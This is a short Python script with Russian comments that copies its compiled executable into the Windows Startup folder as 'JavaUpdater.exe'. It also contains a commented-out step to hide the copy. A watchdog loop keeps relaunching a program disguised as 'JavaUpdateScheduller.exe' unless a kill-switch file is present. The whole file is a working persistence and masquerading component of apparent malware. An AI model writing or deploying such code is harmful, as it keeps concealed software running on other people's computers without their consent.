import os, time, subprocess, shutil, psutil, sys

def copy_to_startup():
    # Путь к папке автозагрузки
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')

    # Путь к скрипту(робит только в собраном виде)
    script_path = sys.executable

    # Путь, по которому копируется скрипт
    destination_path = os.path.join(startup_folder, 'JavaUpdater.exe')

    # Проверка есть файл в автозагрузке
    if not os.path.exists(destination_path):
        shutil.copy(script_path, destination_path)
        print(f"[+] Скрипт успешно добавлен в автозагрузку: {destination_path}")
        
        # Скрываем
        #subprocess.run(f'attrib +h "{destination_path}"', shell=True)
        print(f"[+] Файл скрыт: {destination_path}")
    else:
        print(f"[!] Скрипт уже находится в автозагрузке.")



def is_kill_switch(path_to_folder, filename="kill_la_kill.kill"):
    full_path = os.path.join(path_to_folder, filename)
    return os.path.exists(full_path)



def kill_process(executable_path):
    for process in psutil.process_iter(['pid', 'exe']):
        try:
            if process.info['exe'] and os.path.normpath(process.info['exe']) == os.path.normpath(executable_path):
                process.terminate()
                process.wait(timeout=5)
                print(f"[+] Процесс {executable_path} успешно завершен.")
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    print(f"[-] Процесс {executable_path} не найден или доступ к завершению запрещен.")
    return False



if __name__ == "__main__":
    copy_to_startup()
    soundUP = False

    while True: # проверяем наличие убийцы
        if is_kill_switch(os.path.join(os.path.expanduser("~"), "chach\\killer")):
            # убиваю
            kill_process(os.path.join(os.path.expanduser("~"), "chach\\JavaUpdateScheduller.exe"))
            soundUP = False
        else:
            # поднимаю
            if soundUP == False:
                sound = os.path.join(os.path.expanduser("~"), "chach\\JavaUpdateScheduller.exe")
                print(sound)
                subprocess.Popen(sound)
                soundUP = True # не будет бесконечно поднимать новый процесс
        time.sleep(10)
        